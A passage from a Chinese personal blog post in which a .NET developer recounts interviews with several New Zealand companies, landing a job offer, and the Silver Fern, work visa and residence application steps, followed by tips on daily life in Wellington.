，Task</li>\n<li>var和dynamic</li>\n<li>Singleton</li>\n<li>delegate 和 Event</li>\n<li>Generic ，boxing和unboxing</li>\n<li>Repository模式</li>\n<li>熟悉的设计模式</li>\n<li>WCF</li>\n<li>ASP.NET的Filter</li>\n<li>Authentication和Authorization 这俩单词我老混……</li>\n<li>如何处理Exception 这个问题我没听懂，后来没再让回答。后来回忆，应该是问ASP.NET MVC中的ExceptionFilter</li>\n<li>SQL Server</li>\n</ul>\n<p>现在来看，都是比较基础的，各位应该都可以答个差不多吧。具体深入的话，就看个人经验了，面试并不是固定的题目，interviewer会根据对方的回答继续引申下去，来了解面试者的真实水平。这部分结束后就是一个在线测试，他们提供了一个在线的编程环境，提供了一个完成了部分代码的计算器项目，要求修复bug，并重构。基本上就是找找bug，我用了工厂模式去改他的if，应该都算最基本的了。但是最后也没做完，因为网络太差，每点一下就感觉有延迟。后来结束的时候我说了下我的思路。基本也还算沟通的不错。最后问我还有什么问题，我问了两个，一个是根据他们的开发模式，Scrum/Waterfall如何应对用户的需求变化，一个是他们有没有用到什么公开的第三方库或框架，或者他们自己开发的类库或框架。然后就说后面再联系，面试就结束了。我一看表，已经九点多了，足足进行了两个多小时。站起来的时候感觉腿都软了，一大早都没吃饭。</p>\n<h2>面试B</h2>\n<p>7月31日周一上班，就收到中介的邮件，说另一家公司B的面试安排在周二下午3点，也就是中国的11点。时间还好。但是没说是技术面试还是什么。于是都准备了一下。8月1日早上还是简单回顾了下可能会问到的问题。11点准时电话就来了。这次心态轻松了很多，interviewer应该是这个职位的直接领导，除了一般性的介绍之外，还重点了解了以下问题：</p>\n<ul>\n<li>就简历中提到的项目，个人发挥了什么样的作用？项目架构设计有哪些需要注意的？我谈了关注点分离，依赖倒置，封装等，她又问如何看单一职责，当然这些都是一些软件开发中最基础的概念，就是谈谈自己的理解就好。</li>\n<li>因为简历中提到了部分项目管理工作，就这方面展开，在项目管理方面做了哪些工作？如何测试？因为平时工作确实不负责测试，有别的同事做这个事情，所以就直接说了用哪些框架。还问了数据库的一些内容。</li>\n<li>问了我微软MVP的一些内容，需要做什么工作？感想如何？如何开展活动？这部分是比较轻松的，因为都是实际经历，所以聊的比较放松。</li>\n<li>再就是问我，如果在前端和后端中选择，选哪个？我说还是选后端，因为Web API应用很广泛，可以被多种平台调用。</li>\n<li>还问了开发模式的问题，是传统的瀑布型还是敏捷型。我说传统开发模式已经不适合现代软件开发了，大部分情况下都是敏捷开发，快速响应用户需求变化。</li>\n<li>最后问我还有什么问题，我还是问了如何应对需求变化的问题，她说的也是敏捷模式，每两周一个发布周期。基本上跟我理解的差不多。</li>\n</ul>\n<p>这次面试在友好的气氛中结束。她说会再跟中介联系。</p>\n<p>第二天也就是8月2日，我又给中介发邮件问情况，答复说一个好消息一个坏消息。坏消息是第一个公司A拒绝了我，好消息是第二个公司B让我继续做一个测试。说实话我挺失望的，因为我感觉公司A面试过程还算比较顺利，但不知为何还是没达到他们的要求，给的理由也比较牵强，说我WCF经验不足，我记得当时说的是有WCF经验，但是很久不用WCF了，现在都用Web API了。可能就是因为这个认为我经验不足吧，其实我不说应该也没事。但这就是面试，拒绝你是不需要理由的。我还是按照要求做了公司B的在线测试，这个测试与中介让我做的测试形式一样，但不是编程题了，而是一些阅读理解、逻辑推理方面的题目。我做完后就发邮件告知中介已经完成，让她再帮我问问。8月4日中介答复说我做的还不错，会再约时间。转眼又是一周，8月8日周二我收到了中介的邮件，公司B的面试定在周四，还是11点。这两天还是继续看英文文档，熟悉一些名词的英语说法，准备面试。</p>\n<p>8月10日是第二次面试。过程跟公司A的差不多，记录的时候其实已经知道被拒的结果了，还是记录一下。聊了以下内容：</p>\n<p>首先还是项目经验，就其中提到的SignalR、Angular问了些问题，有什么优势之类的。如何设计Web API，还有RESTful。以及测试的一些问题。坑爹的是SQL，他们问我存储过程，第一次我没听明白，又重复了一次，原来说的是stored procedures，我这么多年一直读的是错的……我不知道其他团队怎么看这个问题，我们现在基本上不用存储过程了，有ORM基本上可以处理大多数的SQL语句，存储过程比较难调试，迁移不同的数据库也比较麻烦，我还是倾向于业务逻辑写在代码里。可能我理解有误，他们想问我存储过程的问题，我谈的是存储过程的劣势，结果以我SQL经验不足的原因拒了。</p>\n<p>又是一次失败，不过这两次也算是宝贵的经验吧。虽然第一次被拒确实很气馁，但另一方面也增强了自信，我这哑巴英语还是能和老外聊起来的，只是需要更多锻炼。再就是数次没有真正理解interviewer的问题，答偏了。所以在回答前，一定要确定interviewer到底要问什么，搞不明白可以再问一次，千万不要瞎猜，不要问A答B。</p>\n<p>8月17日最新的新西兰技术移民打分政策公布了，算了一下还是只有155分，达不到160分的要求，没有offer的话的确很难。</p>\n<p>这段时间投的几个简历依旧没有回音。开始着重研究WorkHere这个网站。这个网站的工作都是开放给海外求职者的，理论上来说比在seek找容易，seek上大部分职位都要求有工签。但另一方面来说就是这个网站的职位相对少很多。算了一下到申请银蕨还有不到三个月时间，再耐心等待机会吧。</p>\n<p>8月23日 朋友帮忙联系的中介回复了，原来休假去了。邮件沟通了一下，定在两天后周五Skype聊一下。聊完后她说会帮忙联系两家公司，但也让我不要抱太大期望。就等着吧。但是之后就跟这个中介失联了……这段时间比较焦虑，一直没有进展，每天都不停的刷收件箱，几乎每周一都发个邮件问一下。一直等到9月13号，才给我回复了消息，说那两家公司并不考虑海外人员。又一个希望破灭了。</p>\n<p>现在已经9月中旬了，离11月还有不到两个月，我估计希望越来越小了。但是还是不能放弃。于是继续在LinkedIn上搜索Jobs，并试图直接添加对方为联系人。但并没有多少进展。</p>\n<p>9月15日跟一个澳大利亚的MVP聊了一下，他给我一个网站：angel.co，这个网站也可以找工作。于是注册了一个账号，但职位比较少，就找了一个看着还合适的申请了。同时还注册了公司A官网的账户，又申请了一个职位。因为公司A还算比较大的IT公司，还是想看有没有其他机会。</p>\n<p>后面几天我在LinkedIn上直接找到了公司A的一个HR，问她是否能考虑我的申请，答复正在过程中。9月22日收到了邮件说我还是没有通过初选，我回邮件很婉转的问了原因，哪方面需要提高，她答复说他们需要3-4年经验的，而我已经10+，还是不合适。我简直郁闷死了，无论怎么尝试，都还是不合适。但还是回了邮件表示感谢，希望如果以后有机会的话再考虑我。其实到这阶段，最开始的信心早就磨的差不多了，之前以为，凭自己的经验找工作应该问题不大，但经过几次挫折，心态也转变了，现在觉得直接收拒信也很正常了。拒啊拒的就习惯了。</p>\n<p>后面一段时间就漫不经心的再继续投。后来发现LinkedIn挺好用，就搞了一个白金账户，可以看出申请某个职位的共有多少人，什么层次的各占多少。还是有一定参考价值的。这期间还投过另一个公司的n个职位，觉得自己条件挺合适，但一直都是被拒。所以有时候被拒真的不需要任何原因。</p>\n<h2>面试C</h2>\n<p>10月12日这天收到一个邮件，是公司C发来的，想聊一聊。第二天就打电话沟通了一下，聊的比较顺利，我觉得这段时间比较大的一个进步是口语流利了一些，想表达的基本都能表达清楚了。10月17日收到邮件，给我发了一个编程题目，让一周后交程序。题目是一个很简单的计算器，对还是计算器，看来这个东西是开发测试之居家必备良药。如果有做开发类的职位，工厂模式，单例这些常用的模式一定要搞明白。题目对语言、表现形式没有任何要求，只提到几点：</p>\n<p>1.设想所有的可能性来解决问题；</p>\n<p>2.提供如何运行程序的说明；</p>\n<p>3.良好的设计和测试</p>\n<p>这几天正在准备参加微软的一个会议，只抽出部分时间做这个测试。为了更全面的展示编程能力，我写了一个Web API作为服务，分别写了一个Angular应用，一个Mobile Web应用，和一个WPF应用来调用。也有用到本地Excel处理等功能，抽象工厂，MVVM，依赖注入，等等。题目提到了测试， 我还分别用微软的测试框架和xUnit Test各写了单元测试。还写了一个很详细的ReadMe来介绍设计思路，特别是对数值的处理，对输入数据的安全校验等等。自己觉得挺完善了，就提交了。用了不到一周的时间。</p>\n<p>但10月25日这天早上我正在吃饭，电话就打过来了。很可惜，又是”unfortunately, you can’t process to the next stage…”。理由给的也很奇葩，说我没用TDD。也许他们看了我的commit记录，看到我是先写的method，再写的unit test。还有一个理由说是他们想要一个具有AWS经验的Senior职位。我也是很失望，他们并没有真正运行我的代码，我觉得这个东西不让他们看看有点可惜，就部署到Azure上了，10月26日又发了个邮件给她，附上部署后的地址，说很感谢希望以后有机会继续考虑我之类的。但马上收到回复原来她休假去了……唉。算了吧。其实这次我真是挺憋屈的，写个计算器demo还用得着TDD么。唉。</p>\n<p>这段时间确实比较焦虑，一方面要继续学英语，还要继续投简历，发邮件，各种不顺。发几十封简历，有答复的也就几个而已。对于海外求职者来说确实太难了。但既然选了这条路，就得继续走下去。</p>\n<h1><a name=\"f\"></a>柳暗花明</h1>\n<p>终于说到重点了。这期间我找到了公司D，这个公司的机会并不是在招聘网站上找的。而是我从移民局的认证雇主列表中，一家家挨个看过去，看他们的官网，看Career页面，如果有合适的职位，就发邮件投简历。从中发现了公司D，这家公司看样子比较理想，也开放职位申请，于是马上发简历。10月18日发了邮件说可以聊一聊，于是约在微软会议之后，10月23日电话联系。感觉这次聊的也挺轻松。她说会再跟团队联系。10月25日收到邮件，说有一个惠灵顿的职位可以试一下，能否10月30日 面试。因为我这几天在准备微软技术大会的session，于是问能否改到大会之后。对方很好说话，还是定在11月6日上午10点，对方是下午3点。</p>\n<p>这几天在LinkedIn上加了个NZ朋友，是公司A的。从他那里了解到一些公司A的情况，他认识当时面试我的人。很感谢他的帮助，他给我推荐了一个职位让我申请看看，还说帮我联系了HR Manager，说问问有没有机会。但这个职位的申请表格一直有个字段无法输入，就暂时放在一边了。</p>\n<p>从最近这段经历来看，我感觉其实还是有一定的机会，但面试经验还需要积累。必须要会表达，把自己了解的东西讲出来才行。面试短短几十分钟，就算水平再高，说不出来人家也没法了解你。除非有一个特牛逼的开源项目，所以我想其实早就应该建个开源项目，持续维护，说不定什么时候就用得上。但说简单，做起来其实很难。最近一年忙于各种杂事，一篇blog也没写，写博客、写代码示例其实都需要花很多的时间，就看如何取舍了。</p>\n<p>11月初几天我都在忙于微软技术大会。11月2日我忙完自己的session后，联系了A公司的朋友，问一下为什么我提交不上。但他问了Recruiter后答复说这个职位已经招到人了，很可惜。他还告诉我说这段时间快到圣诞节了，应该不会有太多的职位放出来了，可能一直到明年二三月份才会有跳槽的。过程确实很难，如果再没有什么进展可能只能等到明年了。但银蕨签证的政策还没出来，也是很不安，群里大家都在问，但都没有任何消息。新政府上台，可能还需要一定的缓冲时间。这期间我通过微软的朋友联系了一位前几年过去新西兰的一位朋友，对方很热心，解答了我很多问题。他也推荐给我一个职位，没有工签要求的，于是我也抽空申请了。但并没有抱很大希望。</p>\n<h2>面试D</h2>\n<p>转眼就到了11月6日，该进行D公司的面试了。这天开始特别不顺利，网络不稳定，由于刚换了个笔记本，连Skype的web插件都下载不下来。后来终于在10点前一两分钟安装完插件登录进会议，还好没有迟到。面试我的是两个人，一个Lead，一个Senior。我感觉这次聊的明显轻松了不少，准备好的一堆打印材料也没用到，直接就开聊。也没聊多少技术问题，主要问了一些技术兴趣，想做哪方面的职位，前端还是后端，MVP的一些体会等等，这些问题基本上都是切身体会，所以回答的还算流利。两个人都很nice，还让我讲个笑话，我开始都没搞明白，为什么让我tell a joke？后来才明白就是为了轻松下气氛。我就讲了一个中国的谐音的笑话然后解释给他们。我觉得对他们来说应该是挺weird，但笑话本来就是基于不同的文化，他们也很配合的笑了。在让我提问的环节我问如果我能得到这个职位，会做什么项目的开发。他们也回答了不少内容，其中提到也会有Xamarin的项目，我很感兴趣，就XAML这些又多聊了几句，我说Xamarin跟WPF，UWP有很多相似的地方，我很有信心在短期内掌握这门技术。这个不是自吹，我确实只写过hello world，没有实际的项目经验，但我熟悉XAML。总之就是让他们相信我愿意学习这些并有能力达到他们的要求。最后他们问我是否愿意参加一个technical test，我当然回答Sure了，他们说会尽快跟Recruiter反馈。我觉得在面试过程中保持微笑，和充分的自信是很必要的，我重点谈了一些我项目中的成功经验，也看到他们频频点头，这应该是get到point的表现。还有一点要提的是有一个面试官的口音很重，经常听不懂他说什么，而且往往重复好几次还是听不明白，只能让对方打字。这个我觉得并不是什么太大的问题，确实是口音问题，需要时间适应。比如test，他发音是tist，我绞尽脑汁也听不出来。后来来到新西兰才知道，本地人的口音确实是这样的，e会发成i，比如 yes他们会说yis……汗啊。</p>\n<p>第二天也就是11月7日，Recruiter发来邮件说可以安排在线编程测试了。测试需要两小时，但最近项目很紧张，所以并没有立即回复。第二天对方又发了邮件，直接给了测试链接，并问了一个关于MicroService的问题。我答复说这周很忙，对方说周末前做完就可以。周日终于挤出一点时间把测试做了，但很可惜没有在规定时间内完成，又多花了半个小时把程序调通，通过邮件发过去了。顺便提一下，<a href=\"https://www.hackerrank.com\" target=\"_blank\">https://www.hackerrank.com</a> 这个网站很不错，有很多面试题可以刷一下。这里要说的是，如果有这种在线编程的测试 ，假如没做完，一定不要放弃，继续在本机调试通过后及时邮件发给对方，让人家知道你有能力完成，并讲清自己的思路。我觉得这是很重要的一个环节，一定要表示出自己对这个职位的强烈意愿。</p>\n<p>等到周二了也没有消息，于是我又发消息问了下，对方说已经转给团队了，有消息就通知我。这两天又发现公司C在招聘，很有意思的是jd上只写了一段代码，是个谜题。我很有兴趣，就解了题，又给当时联系的Recruiter发了个邮件说我仍然对该职位感兴趣，希望有机会进一步沟通之类的。反正就是混个脸熟呗。万一哪天再想起来呢。但是仍然很可惜，第二天C公司答复还是不考虑我的申请。我也是服了。看来近期C公司是没戏了。算了。</p>\n<p>周四公司D的Recruiter通过LinkedIn发消息说可以安排第二次面试了。等到11月20日周一，就发来了邮件，约定第二次面试的时间，对方给了我三个时间选择，考虑到时差的问题，我选了一个中国时间29号上午10点的，这样准备也会比较充分。</p>\n<p>在此还要感谢一位朋友Justin，做UWP开发的多少都听说过吧，他在澳洲多年，也有很多面试他人的经验，28号他听我说起来要参加面试，非常热心的花了一个晚上的时间帮我挨个把面试的常用问题过了一遍，包括回答问题的方式，重点，还有哪些该说哪些不该说，都帮我解释了。于是我满怀信心的准备参加第二次面试，可是计划不如变化。跟他聊完后一会我就突然发起了高烧，直接迷糊过去了。29号强撑着爬起来，准时参加了面试。这次是一个Manager，一个Senior，但问的技术的问题不多，主要是问了Culture Fit的内容。问到的问题包括：</p>\n<ul>\n<li>如何mentor junior developer？</li>\n<li>如何保证代码质量？</li>\n<li>与客户共同工作的经历？</li>\n<li>如何面对需求变化？</li>\n<li>如何处理MVP与工作的关系？</li>\n<li>有没有团队管理的经验？</li>\n</ul>\n<p>等等。聊的话题比较发散，并不是按部就班的把那些常见问题挨个问，而是根据你的回答，再引申出其他的问题，感觉更像一个聊天。比如他们问我与客户共同工作的经历，我谈到了经常要面对频繁的需求变更，他们就接着问怎么面对这些变更，我就说要设计良好的架构，以方便重构代码，使用敏捷方法等，他们接着问怎么敏捷……一环套一环的。最后让我提问题，我问了团队目前有多少人，重点关注的项目内容等等，并表达了自己愿意学习的意愿。然后他们答复会再联系Recruiter。这次面试就结束了。之后我真的是感觉到乏的要命，发烧浑身疼痛，又去睡觉了。11月30日一早5点要抢银蕨签证，这又是一个大事。</p>\n<h2>银蕨签证</h2>\n<p>虽然还是发烧，还是4点多就爬起来了，准备抢2017年度的银蕨签证。这个经历就比较幸运了，移民局网站头两个小时是崩溃的，估计谁都进不去，可能某些人就放弃了，但一直刷的人就在几分钟内刷到了。我自己也是没有抢到，也是之前联系的在新西兰的朋友帮忙抢到的。不管如何，这一步算是过去了。然后我马上给Recruiter发了个邮件，说我已经抢到了银蕨签证的名额，能够尽快去NZ。我希望有这个东西可以免去他们考虑为我做担保工签的麻烦，增加录用我的可能性，虽然不知道有没有用。</p>\n<p>12月1日上班后就收到了Recruiter的邮件，说团队正在讨论下一步的安排了，一旦有消息会尽快通知我。我又回信使劲感谢了一下，顺便说了下我接下来准备申请银蕨签证的步骤，好让他们安心，我马上就可以去了。</p>\n<h2>拿到Offer</h2>\n<p>忐忑的过完一个周末，周一在路上收到了Recruiter的回信，聊了一些移民的建议，我当然要回一个好好感谢的邮件了。然后在准备吃午饭的时候，收到了我梦寐以求的邮件，她说正在准备合同，要给我发offer了。在我按捺着激动的心情思考怎么回邮件的时候，十分钟后第二个正式邮件来了，这次终于是offer邮件了，D公司同意雇佣我，要求我在几天内答复。这一刻简直不敢相信，努力了多半年，就这样拿到了工作机会，一时间竟然有点难以置信。</p>\n<p>总结这几次面试，以下几点需要注意：</p>\n<ul>\n<li>保持积极主动的态度，这边工作没有那么急迫，一定要保持主动，比如这几次面试机会都是主动联系Recruiter拿到的，看到邮箱就发邮件过去问问，混个脸熟</li>\n<li>学会怎么用英文写邮件，一般来说邮件算是比较正式的沟通途径了，态度要礼貌，也不要催太急，不要一两天一问，人家会烦的，保持一两周一次就可以了</li>\n<li>对职位的意愿，持续学习的兴趣</li>\n<li>简历要突出重点，针对不同的职位修改，不要光罗列名词，而是突出自己在项目中的作用，能为公司带来什么样的价值</li>\n<li>提前准备一些常见问题的答案，特别是一些技术名词 ，必须熟悉英语怎么说，比如SOLID原则之类</li>\n<li>不要过分谦虚，也不要吹牛皮，很容易戳破。基于自己的经验说，如果确实不会，就说不熟悉，以后加强学习之类的，但切忌乱说，不然一问就露馅了</li>\n<li>注重团队精神，合作，沟通，</li>\n<li>保持微笑</li>\n</ul>\n<p>……</p>\n<h1><a name=\"g\"></a>签证办理</h1>\n<p>拿到offer后就是按部就班的走程序了。签offer就是把几份文件打印出来，签字，再扫描发回去。打了厚厚一大摞，包括职位描述，offer，以及薪水等等。打印出来签字还真是感觉挺正式的。这就是明年要为其工作的公司了，赶紧在Twitter，Facebook等社交网络上关注公司动向，及时点赞。</p>\n<p>再就是准备银蕨材料了。体检，各种证明。期间领导还收到了公司发来的背景调查邮件，这个就如实填一下了，感觉老外做事真是挺认真，各方面问的都很仔细。</p>\n<h2>银蕨签证</h2>\n<p>因之前办过护照，所以需要准备以下材料：</p>\n<ul>\n<li>体检。先打电话预约日期，按预约时间去体检，过程很简单，抽血，胸透，验尿。一定要注意早上不要吃饭喝水。大概一个小时以内就可以搞定。费用大约是1600左右，不同地区可能费用不同。体检结束会拿到一个回执，提交银蕨资料的时候需要把这个回执放在里面。过几天会收到一个邮件，说体检结果已提交到移民局。</li>\n<li>学历证明。因为学校在豁免名单里，只去学校教务处开了学历证明，是彩色打印的中英文。我还开了成绩单，需要找老师或自己翻译后，再找教务处盖章，但教务处老师说一般他们出的学历证明就够用了，所以也没再翻译成绩单。一份15，我要了6份，打了个折70块钱。后面其实也用不到那么多，我觉得三四份就够了。一般移民局审核完后会还回来。</li>\n<li>无犯罪证明。先去本地派出所开无犯罪证明，三天以后拿。拿到后一定要先去复印个彩色复印件，然后再去做公证。做公证的时候需要带身份证，毕业证，户口本，可能不同地方要求也不同。公证处会把原件收走，所以一定要有个彩色复印件备用。也是三天后拿。公证费用我们这边是160，每加一份20。</li>\n<li>资产证明。证明有相当于4200纽币的存款。这个好办，去银行开就可以了，我开的招商银行的，20一份。但要注意，据说要开冻结资金的那种。保险起见还是冻结一个月，拿到签证再解冻。</li>\n<li>雅思成绩。这个没什么好说的，雅思成绩单原件就够了。</li>\n</ul>\n<p>注意，这些材料只是银蕨签证需要的，不一定适用其他签证类别。但体检、无犯罪证明、雅思成绩这些对大部分签证来说都是必须的。这些材料拖拖拉拉一直到12月下旬才办妥。12月中旬还去给娃办了护照，准备提交EOI。EOI就是移民意向申请，因为有了offer，分数已经够160了，可以提交EOI了。</p>\n<p>12月22日终于把快递发出去了。但马上已经圣诞节了，所以北京新西兰签证申请中心是在圣诞节之后收到快递的。12月27日中午午休了一会，顺便想看看网站上有没有什么新消息，刚打开新西兰签证申请中心的网页，右下角就弹出了邮件通知，材料齐全，已经受理了。同时给了一个受理编号，马上输入到网页里查询，显示：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/f84f9e6f840950bde84b897b1187bb3c.png\" alt=\"\"></p>\n<p>元旦假期后1月2日马上去出入境拿到了娃的护照，仔细校对EOI后就提交了。后来跟群里朋友聊了下，说如果要紧缺职业加分，还得提供工作经历证明，于是又修改了下，把紧缺的分数去掉了。修改EOI的话不用重新缴费，但要填写修改原因，所以尽量一次填好。顺便又去新西兰签证申请中心网站查询状态，早上查还是上次的状态，下午查就更新了：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/92055e3ecb98ff2a6e363e3f43281120.png\" alt=\"\"></p>\n<p>效率这么高！马上去移民局网站查询，发现工签已经批了，状态也更新了，是9个月的工作签证。第二天快递就到了，把我的雅思成绩单原件和学历证明原件和护照一起寄回来了。这下就踏实了。</p>\n<h2>认证雇主工签及EOI</h2>\n<p>接下来几天就继续了解转银蕨二期的情况，可以担保家人一起过来。我的计划是，我先网上提交银蕨二期，等家人的无犯罪证明、体检之类的办好后，再递交纸质资料。但在线申请银蕨二期的时候，又遇到一点问题，需要提交一个Employer Supplementary Form（INZ1113）。应该是雇主帮助填写，于是联系Recruiter，问她是否能帮忙填写这个表格。但对方答复他们不了解这个情况，还说他们是 Accredited Employer ，不需要填这些东西。于是我又改了下申请的签证种类，改成Work to Residence – Accredited Employer Work Visa，即认证雇主工签，现在就不需要那个表格了。认证雇主是移民局的一个列表，都是新西兰比较大的公司，如果在这些公司工作的话，相对是比较稳定的，签证也容易批。1月9日提交了在线的认证雇主工签申请。</p>\n<p>1月10日一大早就起来刷邮件，一直没有。等到九点多看了一下移民局网站，才发现已经变成Selected状态了：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/caac397d0d01584a5e74218ca55354d5.png\" alt=\"\"></p>\n<p>这说明已经被选中了，原来不是一选中就发邮件的。但是工签还是没有任何进展。</p>\n<p>1月13日再刷新工签状态，由Submiting变成了Submitted。</p>\n<p>接下来几天给家人做了体检，1月23日寄出了申请工签和学签的资料，等待EOI的结果。按网上的说法，一般两周左右会出邀请函，1月24日很早就醒了，看两眼手机又迷糊一会。终于在5点多的时候手机收到邮件了，ITA到了！这也标志着进入了实质性的阶段，可以提交资料了。要求在四个月内，也就是5月24日前提交所有资料。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/23a0fdf6d87983e5542e02a3951933ce.png\" alt=\"\"></p>\n<p>1月29日接到移民局办公室的电话，需要提供两个人近两年来的淘宝购物记录，赶紧发邮件过去。我淘宝购物比较少，也补充了一部分京东的购物记录，要显示收件地址为同一个地址才行。注意不要发压缩包，估计他们邮箱会过滤掉的，可以将图片合并成PDF再发送。而我在线提交的工签申请仍然没有变化，还是只显示Submitted。</p>\n<p>近期由于搬家等事情较多，决定到新西兰之后再提交移民资料。所以只需要等工签结果就好。顺利的话一个月后拿到工签，就可以一家人一起过去了。</p>\n<p>2月7日收到了移民局邮件，我的认证雇主工签显示Approved了。但是发现start date与我的offer相同，这样我就没法以这个签证担保家人提前入境了。于是马上给移民局负责我案子的移民官发邮件，询问能否将日期修改为稍提前的时间。第二天就收到了新的确认信，将start date改为了当前日期，感觉这点还是比较人性化的。在线申请的工签不需要在护照上贴纸，是电子签，把邮件打印出来带着就可以了。</p>\n<p>中间经过一个春节假期，2月23日再查看家人的签证进度，都已经处理完了。感觉比较稳妥了，于是买了机票。但奇葩的事情又发生了，2月25日收到家人的护照后，发现把日期搞错了，应该是跟我工签一样的30个月的期限，结果写成了9个月，可能根据我银蕨的期限算的……真是晕了，如果9个月内拿不到绿卡，还得麻烦。赶紧联系移民局上海办公室，火速把护照寄回去重新贴。盼星星盼月亮的，终于在出发前两天拿到护照了。</p>\n<p>这段时期事情比较多，再捋一下。我并不知道公司是因为我拿到了银蕨的名额才同意给我发offer，还是不管我有没有银蕨都会给我offer，我只能说比较幸运，几乎同时两件事都成了。其实从拿到offer的那刻起，银蕨办不办已经没意义了，拿着offer就可以直接申请工签了。但我还是先按照步骤申请的银蕨一期，接着申请认证雇主工签。当认证雇主工签批下来后，银蕨签证就自动无效了。同时我还提交了EOI，即正式移民申请，这个步骤跟申请工签是不同的，需要打够160分，移民局每两周从申请者里面抽，然后发邀请函，即ITA，拿到ITA后在四个月内提交各种资料，再等待后续步骤。</p>\n<p>所以对于没工签就没法工作，没offer就没法申请工签的deadlock来说，可行的步骤就是直接海外申请工作，或者申请假期打工签证和银蕨签证过去找，这两种签证都是短期，都有数量限制。有信心的可以直接拿旅游签过去找。但重要的一点就是最终要有offer，即移民局所说的技术性工作。去年政策更新后，就算海外无offer打分够了160分，很大可能性也是只批一个找工作的工签，而不会直接批绿卡了。另外找到的工作还有薪水要求，详细情况可参看Jack Liu的博客。</p>\n<h1><a name=\"h\"></a>顺利登陆</h1>\n<p>经过几天准备，终于出发前往新西兰。我买的南航，每个人两件托运行李，但到了奥克兰转新西兰航空后，每个人只能托运一件行李，于是又买的行李票。而且行李还超重了，又多交了60刀。所以大家打包行李一定不要超重，控制在23kg以内就可以了。期间不用细说，带小朋友坐这么久的飞机是很辛苦的一段旅程。还好中间睡着了，不然倒时差很难受。到奥克兰是第二天早上七八点，第一感觉是天真蓝！蓝的透亮，一眼看老远。在机场休息了几个小时，吃了点东西，下午一点半飞惠灵顿。一个多小时就到了 ，公司安排的supershuttle来接，顺利抵达临时住处。</p>\n<h1><a name=\"i\"></a>目前状态</h1>\n<p>现已入职，第一个项目是基于Xamarin和UWP的，正在努力学习中。公司提供了全套MSDN订阅，Office365，Resharper等各种工具的授权，不会的也给时间去学，还是很人性化的。当然与之前体制内的工作有所不同，需要时间适应。不会的就问，所以没什么太大问题。语言的话，虽然他们之间对话语速很快确实比较难懂，但直接交流是没问题的。公司各个国家的人都有，氛围不错。每周五下午是Happy Fiday，会开个小party，有抽奖，有次Boss端着个盘子挨个桌送糖吃，我一看赶紧下意识站起来了，一看周围大家都是拿了糖该干嘛干嘛没一个起立的……</p>\n<p>PS：</p>\n<div>澳洲朋友Justin现在已被微软挖走了，真的是被挖走的，真的是超厉害！花一个晚上帮我模拟面试，真是很感激。可惜因为全球MVP峰会和我的入职日期冲突，没有到西雅图见面，希望以后还有机会。前几天的微软全球Build大会，他负责的demo获得了极高的关注度，真是佩服。</div>\n<p>申请绿卡的资料在国内基本都准备好了，主要是婚姻关系这个比较麻烦，所以可以提前准备，有两人姓名、相同地址的信用卡账单，租房合同，照片等。拿到雇主补充表格后我就跟租房合同一起寄过去了，目前状态是Application Received了，期间让我重新寄护照的有效复印件，不是自己复印的那种，必须经过认证，可以找当地的太平绅士盖个章，免费的。</p>\n<p>生活上来说，这边菜价比较贵，确实贵，一个茄子三刀，相当于十多块人民币。肉也贵点，打折的话也还可以接受。冰淇淋之类的奶制品超划算，一大桶冰淇淋就三四刀，够吃好几天的了。国内哈根达斯一个球还好几十呢。我们三口人一周吃饭大概不到200刀。刚来的时候还吃过几次餐馆，不过感觉真是……。还是自己做吧。</p>\n<p>住宿方面，租了一个小公寓，一周大概五六百刀。租单间的话会便宜些。主要是考虑上班方便，没有租郊区的，如果有车住郊区更便宜一些，房子条件也更好。这边租房还是比较紧张的，往往一个房子n个租客竞争，所以申请的时候可以适当提高价格增强竞争力。但是这边有的人也不是只看钱，我也遇到过有的房东给加钱都不同意的，说必须给所有的申请者同样的机会……</p>\n<p>有了住处之后，拿着租房合同就可以去给娃注册学校了。这边不管是买的房子还是租的房子，都可以免费上公立小学。现在娃已经上学，适应的还不错。早上九点前到校，到下午三点放学，老师每天会发不同的书回家读，都是很简单的分级阅读故事书。学校每周有中文课，有时候回来还告诉我说老师还教手语了。反正感觉跟国内不是一个套路。</p>\n<p>公共医疗，如果拿到两年以上的工签，可以享受公共医疗服务。需要注册家庭医生。</p>\n<p>具体各种细节就不赘述了，放几个可能会用到的网址：</p>\n<p>TradeMe：<br>\n<a href=\"http://www.trademe.co.nz\" target=\"_blank\">http://www.trademe.co.nz</a><br>\n看房子情况：<br>\n<a href=\"https://homes.co.nz/app/\" target=\"_blank\">https://homes.co.nz/app/</a><br>\n看学校学区：<br>\n<a href=\"http://www.educationcounts.govt.nz/find-school\" target=\"_blank\">http://www.educationcounts.govt.nz/find-school</a><br>\n<a href=\"http://nzschools.tki.org.nz/\" target=\"_blank\">http://nzschools.tki.org.nz/</a><br>\n查询学校：<br>\n<a href=\"http://www.education.govt.nz/\" target=\"_blank\">http://www.education.govt.nz/</a><br>\n<a href=\"http://www.ero.govt.nz/review-reports/\" target=\"_blank\">http://www.ero.govt.nz/review-reports/</a><br>\n<a href=\"https://www.parliament.nz/resource/0000010847\" target=\"_blank\">https://www.parliament.nz/resource/0000010847</a><br>\n买家具：<br>\n<a href=\"http://www.harveynorman.co.nz/\" target=\"_blank\">http://www.harveynorman.co.nz/</a> 超级贵<br>\n<a href=\"http://www.briscoes.co.nz/\" target=\"_blank\">http://www.briscoes.co.nz/</a> 打折的时候还可以<br>\n租房合同参考：<br>\n<a href=\"https://www.tenancy.govt.nz/starting-a-tenancy/tenancy-agreements/\" target=\"_blank\">https://www.tenancy.govt.nz/starting-a-tenancy/tenancy-agreements/</a><br>\n住建部官网：<br>\n<a href=\"https://www.building.govt.nz/\" target=\"_blank\">https://www.building.govt.nz/</a><br>\n公车卡：<br>\n<a href=\"https://www.snapper.co.nz/buying-a-snapper/\" target=\"_blank\">https://www.snapper.co.nz/buying-a-snapper/</a><br>\n太平绅士<br>\n<a href=\"http://www.cab.org.nz/vat/gl/ls/Pages/JusticesofthePeaceandNotariesPublic.aspx\" target=\"_blank\">http://www.cab.org.nz/vat/gl/ls/Pages/JusticesofthePeaceandNotariesPublic.aspx</a><br>\n医疗<br>\n<a href=\"https://www.newzealandnow.govt.nz/living-in-nz/healthcare\" target=\"_blank\">https://www.newzealandnow.govt.nz/living-in-nz/healthcare</a><br>\n注册家庭医生<br>\nNZ health &amp; disability system (Mandarin)<br>\n<a href=\"https://vimeo.com/165066759\" 